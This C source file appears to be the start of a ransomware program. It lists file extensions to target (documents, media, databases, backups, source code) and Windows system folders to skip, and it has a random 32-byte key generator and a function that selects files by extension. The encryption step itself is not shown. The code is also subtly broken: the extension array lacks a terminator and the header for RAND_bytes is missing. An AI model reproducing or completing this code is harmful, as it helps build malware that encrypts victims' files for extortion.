#include <stdio.h>
#include <stdlib.h>
#include <string.h>


#define KEY_SIZE 32

const char *extensions[] = {
    // Text Files
    "doc", "docx", "msg", "odt", "wpd", "wps", "txt",
    // Data files
    "csv", "pps", "ppt", "pptx",
    // Audio Files
    "aif", "iif", "m3u", "m4a", "mid", "mp3", "mpa", "wav", "wma",
    // Video Files
    "3gp", "3g2", "avi", "flv", "m4v", "mov", "mp4", "mpg", "vob", "wmv",
    // 3D Image files
    "3dm", "3ds", "max", "obj", "blend",
    // Raster Image Files
    "bmp", "gif", "png", "jpeg", "jpg", "psd", "tif", "gif", "ico",
    // Vector Image files
    "ai", "eps", "ps", "svg",
    // Page Layout Files
    "pdf", "indd", "pct", "epub",
    // Spreadsheet Files
    "xls", "xlr", "xlsx",
    // Database Files
    "accdb", "sqlite", "dbf", "mdb", "pdb", "sql", "db",
    // Game Files
    "dem", "gam", "nes", "rom", "sav",
    // Temp Files
    "bkp", "bak", "tmp",
    // Config files
    "cfg", "conf", "ini", "prf",
    // Source files
    "html", "php", "js", "c", "cc", "py", "lua", "go", "java"
};

const char *skip_dir[] = {
    "ProgramData",
    "Windows",
    "bootmgr",
    "$WINDOWS.~BT",
    "Windows.old",
    "Temp",
    "tmp",
    "Program Files",
    "Program Files (x86)",
    "AppData",
    "$Recycle.Bin",
};


void generate_random_key(char *key) {
    if (RAND_bytes((unsigned char *)key, KEY_SIZE) != 1) {
        fprintf(stderr, "Error generating random key\n");
        exit(EXIT_FAILURE);
    }
}

int interessing_extension(const char *filename) {
    const char *dot = strrchr(filename, '.');

    if (!dot || dot == filename) return 0;

    const char *ext = dot + 1;

    for (int i = 0; extensions[i]; i++) {
        if (strcmp(ext, extensions[i]) == 0) {
            return 1;
        }
    }

    return 0;
}